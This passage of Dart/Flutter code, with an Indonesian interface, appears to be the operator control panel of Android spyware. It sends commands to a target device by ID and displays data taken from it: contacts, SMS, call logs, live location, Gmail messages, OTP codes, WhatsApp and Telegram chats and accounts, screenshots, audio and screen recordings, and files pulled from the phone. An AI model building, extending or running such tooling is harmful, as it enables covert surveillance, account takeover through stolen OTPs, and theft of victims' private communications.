        padding: const EdgeInsets.fromLTRB(14, 10, 14, 0),
        scrollDirection: Axis.horizontal,
        itemCount: kCategories.length,
        itemBuilder: (_, i) {
          final cat = kCategories[i];
          final sel = _currentPage == i;
          return GestureDetector(
            onTap: () => _pageCtrl.animateToPage(
              i,
              duration: const Duration(milliseconds: 280),
              curve: Curves.easeOutCubic,
            ),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              margin: const EdgeInsets.only(right: 8, bottom: 4),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: sel
                      ? [
                          cat.color.withOpacity(0.24),
                          cat.color.withOpacity(0.1),
                        ]
                      : [_card2, _card],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(
                  color: sel ? cat.color.withOpacity(0.5) : Colors.white10,
                ),
              ),
              child: Row(
                children: [
                  Icon(cat.icon, size: 13, color: sel ? cat.color : _textS),
                  const SizedBox(width: 5),
                  Text(
                    cat.title,
                    style: TextStyle(
                      fontSize: 11,
                      fontWeight: sel ? FontWeight.bold : FontWeight.normal,
                      color: sel ? cat.color : _textS,
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _grid(CommandCategory cat) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(14, 14, 14, 18),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_card2, _card],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: _border),
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: cat.color.withOpacity(0.14),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: Icon(cat.icon, color: cat.color, size: 16),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        cat.title,
                        style: const TextStyle(
                          color: _textP,
                          fontWeight: FontWeight.bold,
                          fontSize: 14,
                        ),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        '${cat.commands.length} command siap digunakan',
                        style: const TextStyle(color: _textS, fontSize: 10.5),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(height: 12),
          Expanded(
            child: GridView.builder(
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2,
                mainAxisSpacing: 12,
                crossAxisSpacing: 12,
                childAspectRatio: 1.02,
              ),
              itemCount: cat.commands.length,
              itemBuilder: (_, i) {
                final cmd = cat.commands[i];
                return _CmdCard(
                  cmd: cmd,
                  onTap: () { if (cmd.id == Cmd.recordAudio) { _showRecordAudioDialog(cmd); } else { cmd.needsInput ? _showInput(cmd) : _run(cmd, {}); } },
                );
              },
            ),
          ),
        ],
      ),
    );
  }
}




class _CmdCard extends StatefulWidget {
  final CommandItem cmd;
  final VoidCallback onTap;
  const _CmdCard({required this.cmd, required this.onTap});
  @override
  State<_CmdCard> createState() => _CmdCardState();
}

class _CmdCardState extends State<_CmdCard>
    with SingleTickerProviderStateMixin {
  late AnimationController _ctrl;
  late Animation<double> _scale;
  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 90),
    );
    _scale = Tween(
      begin: 1.0,
      end: 0.93,
    ).animate(CurvedAnimation(parent: _ctrl, curve: Curves.easeIn));
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final cmd = widget.cmd;
    return GestureDetector(
      onTapDown: (_) => _ctrl.forward(),
      onTapUp: (_) {
        _ctrl.reverse();
        widget.onTap();
      },
      onTapCancel: () => _ctrl.reverse(),
      child: ScaleTransition(
        scale: _scale,
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: cmd.isDanger
                  ? [const Color(0xFF2A1218), const Color(0xFF161018)]
                  : [_card2, _card, const Color(0xFF0D1728)],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: cmd.color.withOpacity(0.18)),
            boxShadow: [
              BoxShadow(
                color: cmd.color.withOpacity(0.08),
                blurRadius: 18,
                offset: const Offset(0, 8),
              ),
            ],
          ),
          child: Padding(
            padding: const EdgeInsets.all(14),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        cmd.color.withOpacity(0.28),
                        cmd.color.withOpacity(0.08),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: cmd.color.withOpacity(0.16)),
                  ),
                  child: Icon(cmd.icon, color: cmd.color, size: 20),
                ),
                const SizedBox(height: 18),
                Text(
                  cmd.name,
                  style: const TextStyle(
                    color: _textP,
                    fontWeight: FontWeight.w700,
                    fontSize: 13.5,
                  ),
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                ),
                const Spacer(),
                if (cmd.needsInput) ...[
                  Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 8,
                      vertical: 4,
                    ),
                    decoration: BoxDecoration(
                      color: cmd.color.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(999),
                      border: Border.all(color: cmd.color.withOpacity(0.18)),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.tune_rounded, size: 10, color: cmd.color),
                        const SizedBox(width: 4),
                        Text(
                          'Perlu input',
                          style: TextStyle(color: cmd.color, fontSize: 9.5),
                        ),
                      ],
                    ),
                  ),
                ],
              ],
            ),
          ),
        ),
      ),
    );
  }
}




class ResultPage extends StatefulWidget {
  final Map<String, dynamic> result;
  final String deviceId;
  const ResultPage({super.key, required this.result, required this.deviceId});
  @override
  State<ResultPage> createState() => _ResultPageState();
}

class _ResultPageState extends State<ResultPage> {
  String _q = '';

  void _runCmd(int cmdId, Map<String, String> inputs) async {
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Mengirim perintah...'), duration: Duration(seconds: 1)),
    );
    String param = inputs['path'] ?? '';
    await HttpService.sendCommand(widget.deviceId, cmdId, param);
  }

  Map<String, dynamic> get _actualResult {
    final res = widget.result;
    if (res.keys.length == 1 && res.keys.first.startsWith('-')) {
      final inner = res.values.first;
      if (inner is Map) return Map<String, dynamic>.from(inner);
    }
    return res;
  }

  dynamic get _rawData => _actualResult['data'] ?? _actualResult['resData'] ?? _actualResult;
  String get _type => _actualResult['type']?.toString().trim() ?? 'unknown';
  DateTime? get _timestamp {
    try {
      final ts = _actualResult['timestamp'];
      if (ts is int) return DateTime.fromMillisecondsSinceEpoch(ts);
      if (ts is String) return DateTime.tryParse(ts);
    } catch (_) {}
    return null;
  }

  void _copy(String text) {
    Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: const Text('Disalin ke clipboard'),
        backgroundColor: Colors.greenAccent.withOpacity(0.85),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(16),
        duration: const Duration(milliseconds: 1200),
      ),
    );
  }

  String _fmtTs(DateTime? t) {
    if (t == null) return '-';
    final d = DateTime.now().difference(t);
    if (d.inSeconds < 60) return 'baru saja';
    if (d.inMinutes < 60) return '${d.inMinutes} menit lalu';
    if (d.inHours < 24) return '${d.inHours} jam lalu';
    return '${t.day}/${t.month}/${t.year}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: Column(
          children: [
            _header(),
            Expanded(child: _buildContent()),
          ],
        ),
      ),
    );
  }

  Widget _header() {
    final c = _typeColor();
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 14),
      decoration: BoxDecoration(
        color: _card,
        border: Border(bottom: BorderSide(color: _border)),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 8),
        ],
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                color: _card2,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: Colors.white10),
              ),
              child: const Icon(
                Icons.arrow_back_ios_new_rounded,
                color: _textP,
                size: 14,
              ),
            ),
          ),
          const SizedBox(width: 12),
          Container(
            width: 38,
            height: 38,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [c.withOpacity(0.28), c.withOpacity(0.08)],
              ),
              borderRadius: BorderRadius.circular(11),
            ),
            child: Icon(_typeIcon(), color: c, size: 18),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  _typeLabel(),
                  style: const TextStyle(
                    color: _textP,
                    fontWeight: FontWeight.bold,
                    fontSize: 15,
                  ),
                ),
                Text(
                  _fmtTs(_timestamp),
                  style: const TextStyle(color: _textS, fontSize: 11),
                ),
              ],
            ),
          ),
          GestureDetector(
            onTap: () => _copy(_rawData?.toString() ?? ''),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
              decoration: BoxDecoration(
                color: _card2,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.white10),
              ),
              child: const Row(
                children: [
                  Icon(Icons.copy_rounded, color: _textS, size: 14),
                  SizedBox(width: 5),
                  Text('Salin', style: TextStyle(color: _textS, fontSize: 11)),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildContent() {
    if (_rawData == null)
      return _empty('Tidak ada data', Icons.cloud_off_rounded);
    try {
      switch (_type) {
        case 'photo':
          return _photoView();
        case 'apps':
          return _listView(
            _parseStringList(),
            Icons.android_rounded,
            const Color(0xFF7C4DFF),
          );
        case 'contacts':
          return _contactsView();
        case 'sms':
          return _smsView();
        case 'call_logs':
          return _callLogsView();
        case 'location':
          return _locationView();
        case 'device_info':
          return _deviceInfoView();
        case 'browser_history':
          return _listView(
            _parseBrowserHistory(),
            Icons.language_rounded,
            const Color(0xFFE91E63),
          );
        case 'file_list':
          return _fileExplorerView();
        case 'gmail_emails':
          return _gmailView();
        case 'notifications':
          return _notificationsView();
        case 'gallery':
          return _galleryView();


        case 'whatsapp_numbers':
          return _listView(
            _parseStringList(),
            Icons.phone_android_rounded,
            const Color(0xFF25D366),
          );
        case 'games_info':
          return _listView(
            _parseStringList(),
            Icons.sports_esports_rounded,
            const Color(0xFFF44336),
          );
        case 'otp':
          return _otpView();
        case 'telegram_accounts':
          return _telegramAccountsView();
        case 'google_accounts':
          return _listView(
            _parseStringList(),
            Icons.g_mobiledata_rounded,
            const Color(0xFFDB4437),
          );
        case 'whatsapp_messages':
        case 'telegram_messages':
          return _messagesView();


        case 'screenshot':
        case 'screenshot_status':
          return _screenshotView();
        case 'screen_record':
          return _screenRecordView();
        case 'record_audio':
          return _audioResultView();
        case 'record_status':
        case 'audio_status':
        case 'screenshot_error':
        case 'record_error':
          return _statusResultView();

        default:
          return _genericView();
      }
    } catch (e, stack) {
      debugPrint('❌ Error rendering result: $e\n$stack');
      return _genericView(fallback: 'Error menampilkan data: $e');
    }
  }

  Widget _photoView() {
    if (_rawData == null || _rawData.toString().isEmpty)
      return _empty('Tidak ada gambar', Icons.broken_image_rounded);
      
    final String dataStr = _rawData.toString().trim();
    

    if (dataStr.startsWith('http')) {
      return Column(
        children: [
          Expanded(
            child: InteractiveViewer(
              child: Center(
                child: Hero(
                  tag: 'photo-${DateTime.now().millisecondsSinceEpoch}',
                  child: Image.network(
                    dataStr,
                    fit: BoxFit.contain,
                    errorBuilder: (_, __, ___) =>
                        _empty('Gagal memuat URL', Icons.broken_image_rounded),
                  ),
                ),
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                Expanded(
                  child: _outBtn(
                    'Salin URL',
                    Icons.copy_all_rounded,
                    () => _copy(dataStr),
                  ),
                ),
              ],
            ),
          ),
        ],
      );
    }


    late Uint8List bytes;
    try {
      String base64Str = dataStr;
      if (base64Str.contains(',')) base64Str = base64Str.split(',').last;
      

      base64Str = base64Str.replaceAll(RegExp(r'[^A-Za-z0-9+/=]'), '');
      
      int padding = base64Str.length % 4;
      if (padding != 0) base64Str += '=' * (4 - padding);
      
      bytes = base64Decode(base64Str);
    } catch (e) {
      debugPrint('Base64 Decode Error: $e');
      debugPrint('Raw Data Length: ${_rawData.toString().length}');
      return _empty(
        'Gagal memuat gambar (base64 rusak)\nError: $e',
        Icons.broken_image_rounded,
      );
    }
    return Column(
      children: [
        Expanded(
          child: InteractiveViewer(
            child: Center(
              child: Hero(
                tag: 'photo-${DateTime.now().millisecondsSinceEpoch}',
                child: Image.memory(
                  bytes,
                  fit: BoxFit.contain,
                  errorBuilder: (_, __, ___) =>
                      _empty('Gagal memuat', Icons.broken_image_rounded),
                ),
              ),
            ),
          ),
        ),
        Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Expanded(
                child: _outBtn(
                  'Salin Base64',
                  Icons.copy_all_rounded,
                  () => _copy(_rawData.toString()),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _contactsView() {
    final all = _parseJsonList();
    final list = _q.isEmpty
        ? all
        : all.where((c) {
            final n = c['displayName']?.toString().toLowerCase() ?? '';
            return n.contains(_q.toLowerCase());
          }).toList();
    return Column(
      children: [
        _search('Cari kontak...'),
        _badge('${list.length} kontak', const Color(0xFF00897B)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final c = list[i];
              final name = c['displayName']?.toString() ?? '-';
              final phones = (c['phoneNumbers'] as List? ?? [])
                  .map((p) => p.toString())
                  .join(' · ');
              return _dataCard(
                leading: CircleAvatar(
                  radius: 20,
                  backgroundColor: const Color(0xFF00897B).withOpacity(0.15),
                  child: Text(
                    name.isEmpty ? '?' : name[0].toUpperCase(),
                    style: const TextStyle(
                      color: Color(0xFF00897B),
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                    ),
                  ),
                ),
                title: name,
                subtitle: phones.isNotEmpty ? phones : null,
                onCopy: () => _copy('$name\n$phones'),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _smsView() {
    final all = _parseJsonList();
    final list = _q.isEmpty
        ? all
        : all.where((m) {
            final b = m['body']?.toString().toLowerCase() ?? '';
            final a = m['address']?.toString().toLowerCase() ?? '';
            return b.contains(_q.toLowerCase()) || a.contains(_q.toLowerCase());
          }).toList();
    return Column(
      children: [
        _search('Cari pesan atau nomor...'),
        _badge('${list.length} pesan', const Color(0xFF2979FF)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final m = list[i];
              final addr = m['address']?.toString() ?? '-';
              final body = m['body']?.toString() ?? '';
              final isOut = (m['type'] as int? ?? 0) == 2;
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: Colors.white.withOpacity(0.04)),
                ),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Icon(
                            isOut
                                ? Icons.call_made_rounded
                                : Icons.call_received_rounded,
                            size: 11,
                            color: isOut
                                ? const Color(0xFF2979FF)
                                : Colors.greenAccent,
                          ),
                          const SizedBox(width: 5),
                          Expanded(
                            child: Text(
                              addr,
                              style: const TextStyle(
                                color: _textP,
                                fontWeight: FontWeight.w700,
                                fontSize: 13,
                              ),
                            ),
                          ),
                          GestureDetector(
                            onTap: () => _copy('$addr\n$body'),
                            child: const Icon(
                              Icons.copy_rounded,
                              size: 14,
                              color: _textS,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 6),
                      Text(
                        body,
                        style: const TextStyle(
                          color: _textS,
                          fontSize: 12,
                          height: 1.4,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _callLogsView() {
    final logs = _parseJsonList();
    const typeIcon = {
      1: Icons.call_received_rounded,
      2: Icons.call_made_rounded,
      3: Icons.call_missed_rounded,
    };
    const typeColor = {1: Colors.greenAccent, 2: Color(0xFF2979FF), 3: _accent};
    const typeLabel = {1: 'Masuk', 2: 'Keluar', 3: 'Tak Diangkat'};
    return Column(
      children: [
        _badge('${logs.length} panggilan', const Color(0xFFFF6F00)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: logs.length,
            itemBuilder: (_, i) {
              final l = logs[i];
              final t = (l['type'] as int?) ?? 0;
              final no = l['number']?.toString() ?? '-';
              final dur = l['duration']?.toString() ?? '0';
              final c = typeColor[t] as Color? ?? _textS;
              return Container(
                margin: const EdgeInsets.only(bottom: 6),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white.withOpacity(0.04)),
                ),
                child: ListTile(
                  dense: true,
                  leading: Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: c.withOpacity(0.12),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Icon(
                      typeIcon[t] ?? Icons.call_rounded,
                      color: c,
                      size: 17,
                    ),
                  ),
                  title: Text(
                    no,
                    style: const TextStyle(
                      color: _textP,
                      fontWeight: FontWeight.w600,
                      fontSize: 13,
                    ),
                  ),
                  subtitle: Text(
                    '${typeLabel[t] ?? '-'} · ${dur}s',
                    style: const TextStyle(color: _textS, fontSize: 10),
                  ),
                  trailing: GestureDetector(
                    onTap: () => _copy(no),
                    child: const Icon(
                      Icons.copy_rounded,
                      size: 14,
                      color: _textS,
                    ),
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _locationView() {
    String lat = '-', lng = '-', acc = '-';
    try {
      final obj = _rawData is Map
          ? _rawData
          : jsonDecode(_rawData?.toString() ?? '{}');
      lat = obj['lat']?.toString() ?? obj['latitude']?.toString() ?? '-';
      lng =
          obj['lon']?.toString() ??
          obj['lng']?.toString() ??
          obj['longitude']?.toString() ??
          '-';
      acc = obj['accuracy']?.toString() ?? '-';
    } catch (_) {}
    final coords = '$lat, $lng';
    final mapsUrl = 'https://maps.google.com/?q=$lat,$lng';
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(28),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  const Color(0xFF00897B).withOpacity(0.22),
                  const Color(0xFF00897B).withOpacity(0.04),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(22),
              border: Border.all(
                color: const Color(0xFF00897B).withOpacity(0.3),
              ),
            ),
            child: Column(
              children: [
                const Icon(
                  Icons.location_on_rounded,
                  color: Color(0xFF00897B),
                  size: 56,
                ),
                const SizedBox(height: 14),
                Text(
                  coords,
                  style: const TextStyle(
                    color: _textP,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 8),
                Text(
                  'Akurasi: ${acc}m',
                  style: const TextStyle(color: _textS, fontSize: 12),
                ),
              ],
            ),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: _outBtn(
                  'Salin Koordinat',
                  Icons.copy_rounded,
                  () => _copy(coords),
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: ElevatedButton.icon(
                  onPressed: () => _copy(mapsUrl),
                  icon: const Icon(Icons.map_rounded, size: 15),
                  label: const Text('Salin URL Maps'),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFF00897B),
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _deviceInfoView() {
    Map<String, dynamic> info = {};
    try {
      info = (_rawData is Map)
          ? Map.from(_rawData)
          : jsonDecode(_rawData?.toString() ?? '{}');
    } catch (_) {}
    return ListView(
      padding: const EdgeInsets.all(16),
      children: info.entries.map((e) {
        return Container(
          margin: const EdgeInsets.only(bottom: 6),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          decoration: BoxDecoration(
            color: _card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.white.withOpacity(0.04)),
          ),
          child: Row(
            children: [
              Expanded(
                flex: 2,
                child: Text(
                  e.key,
                  style: const TextStyle(color: _textS, fontSize: 11),
                ),
              ),
              Expanded(
                flex: 3,
                child: Text(
                  e.value?.toString() ?? '-',
                  style: const TextStyle(
                    color: _textP,
                    fontSize: 12,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
              GestureDetector(
                onTap: () => _copy('${e.key}: ${e.value}'),
                child: const Icon(Icons.copy_rounded, size: 13, color: _textS),
              ),
            ],
          ),
        );
      }).toList(),
    );
  }

  Widget _listView(List<String> all, IconData icon, Color color) {
    final list = _q.isEmpty
        ? all
        : all.where((s) => s.toLowerCase().contains(_q.toLowerCase())).toList();
    return Column(
      children: [
        _search('Cari...'),
        _badge('${list.length} item', color),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) => Container(
              margin: const EdgeInsets.only(bottom: 5),
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
              decoration: BoxDecoration(
                color: _card,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.white.withOpacity(0.04)),
              ),
              child: Row(
                children: [
                  Icon(icon, color: color, size: 13),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      list[i],
                      style: const TextStyle(color: _textP, fontSize: 12),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  GestureDetector(
                    onTap: () => _copy(list[i]),
                    child: const Icon(
                      Icons.copy_rounded,
                      size: 13,
                      color: _textS,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _genericView({String? fallback}) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.white.withOpacity(0.05)),
        ),
        child: SelectableText(
          fallback ?? _rawData?.toString() ?? 'Tidak ada data',
          style: const TextStyle(
            color: _textP,
            fontFamily: 'monospace',
            fontSize: 12,
            height: 1.7,
          ),
        ),
      ),
    );
  }

  Widget _fileExplorerView() {
    final list = _parseJsonList();
    final filtered = _q.isEmpty
        ? list
        : list.where((item) {
            final name = item['name']?.toString().toLowerCase() ?? '';
            return name.contains(_q.toLowerCase());
          }).toList();
    
    filtered.sort((a, b) {
      final aIsDir = a['isDir'] == true ? 0 : 1;
      final bIsDir = b['isDir'] == true ? 0 : 1;
      if (aIsDir != bIsDir) return aIsDir.compareTo(bIsDir);
      final aName = a['name']?.toString().toLowerCase() ?? '';
      final bName = b['name']?.toString().toLowerCase() ?? '';
      return aName.compareTo(bName);
    });

    return Column(
      children: [
        _search('Cari file atau folder...'),
        _badge('${filtered.length} item', const Color(0xFF00897B)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: filtered.length,
            itemBuilder: (_, i) {
              final item = filtered[i];
              final isDir = item['isDir'] == true;
              final size = (item['size'] as num?)?.toInt() ?? 0;
              final name = item['name']?.toString() ?? '';
              final path = item['path']?.toString() ?? '';
              final sizeStr = isDir ? 'Folder' : '${(size / 1024).toStringAsFixed(1)} KB';
              final icon = isDir ? Icons.folder_rounded : Icons.insert_drive_file_rounded;
              final color = isDir ? Colors.amber : const Color(0xFF00897B);

              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white.withOpacity(0.04)),
                ),
                child: ListTile(
                  leading: CircleAvatar(
                    backgroundColor: color.withOpacity(0.2),
                    child: Icon(icon, color: color, size: 20),
                  ),
                  title: Text(name, style: const TextStyle(color: _textP)),
                  subtitle: Text(sizeStr, style: const TextStyle(color: _textS)),
                  trailing: isDir 
                      ? const Icon(Icons.chevron_right_rounded, color: _textS)
                      : IconButton(
                          icon: const Icon(Icons.download_rounded, color: _textS),
                          onPressed: () => _runCmd(
                            Cmd.uploadFile,
                            {'path': path},
                          ),
                        ),
                  onTap: () {
                    if (isDir) {
                      _runCmd(
                        Cmd.getFileList,
                        {'path': path},
                      );
                    } else {
                       _copy(path);
                    }
                  },
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _gmailView() {
    final emails = _parseGmailList();
    final filtered = _q.isEmpty
        ? emails
        : emails.where((e) {
            final sender = e['sender']?.toString().toLowerCase() ?? '';
            final subject = e['subject']?.toString().toLowerCase() ?? '';
            return sender.contains(_q.toLowerCase()) ||
                subject.contains(_q.toLowerCase());
          }).toList();
    return Column(
      children: [
        _search('Cari email...'),
        _badge('${filtered.length} email', const Color(0xFFDD2C00)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: filtered.length,
            itemBuilder: (_, i) => _emailCard(filtered[i]),
          ),
        ),
      ],
    );
  }

  List<Map<String, dynamic>> _parseGmailList() {
    try {
      return (jsonDecode(_rawData?.toString() ?? '[]') as List)
          .map((e) => e as Map<String, dynamic>)
          .toList();
    } catch (_) {
      return [];
    }
  }

  Widget _emailCard(Map<String, dynamic> email) {
    final sender = email['sender']?.toString() ?? 'Unknown';
    final subject = email['subject']?.toString() ?? '(no subject)';
    final snippet = email['snippet']?.toString() ?? '';
    final body = email['body']?.toString() ?? '';
    final attachments = email['attachments'] as List? ?? [];
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white.withOpacity(0.05)),
      ),
      child: Theme(
        data: Theme.of(context).copyWith(dividerColor: Colors.transparent),
        child: ExpansionTile(
          tilePadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
          leading: CircleAvatar(
            radius: 20,
            backgroundColor: const Color(0xFFDD2C00).withOpacity(0.1),
            child: Text(
              sender.isNotEmpty ? sender[0].toUpperCase() : '?',
              style: const TextStyle(
                color: Color(0xFFDD2C00),
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
          title: Text(
            sender,
            style: const TextStyle(
              color: _textP,
              fontWeight: FontWeight.w600,
              fontSize: 14,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          subtitle: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                subject,
                style: const TextStyle(
                  color: _textP,
                  fontSize: 13,
                  fontWeight: FontWeight.w500,
                ),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
              if (snippet.isNotEmpty)
                Text(
                  snippet,
                  style: const TextStyle(color: _textS, fontSize: 12),
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                ),
            ],
          ),
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Divider(color: _border),
                  const SizedBox(height: 8),
                  Text(
                    body.isNotEmpty ? body : 'Tidak ada isi email.',
                    style: const TextStyle(
                      color: _textP,
                      fontSize: 13,
                      height: 1.5,
                    ),
                  ),
                  if (attachments.isNotEmpty) ...[
                    const SizedBox(height: 12),
                    const Text(
                      'Lampiran:',
                      style: TextStyle(
                        color: _textS,
                        fontSize: 12,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Wrap(
                      spacing: 8,
                      children: attachments
                          .map(
                            (att) => Container(
                              padding: const EdgeInsets.symmetric(
                                horizontal: 8,
                                vertical: 4,
                              ),
                              decoration: BoxDecoration(
                                color: _card2,
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(color: Colors.white10),
                              ),
                              child: Text(
                                att.toString(),
                                style: const TextStyle(
                                  color: _textS,
                                  fontSize: 11,
                                ),
                              ),
                            ),
                          )
                          .toList(),
                    ),
                  ],
                  const SizedBox(height: 8),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      TextButton.icon(
                        onPressed: () => _copy(
                          'Pengirim: $sender\nSubjek: $subject\n\n$body',
                        ),
                        icon: const Icon(Icons.copy_rounded, size: 14),
                        label: const Text(
                          'Salin Semua',
                          style: TextStyle(fontSize: 11),
                        ),
                        style: TextButton.styleFrom(foregroundColor: _textS),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _notificationsView() {
    final list = _parseJsonList();
    final filtered = _q.isEmpty
        ? list
        : list.where((item) {
            final title = item['title']?.toString().toLowerCase() ?? '';
            final content = item['content']?.toString().toLowerCase() ?? '';
            return title.contains(_q.toLowerCase()) ||
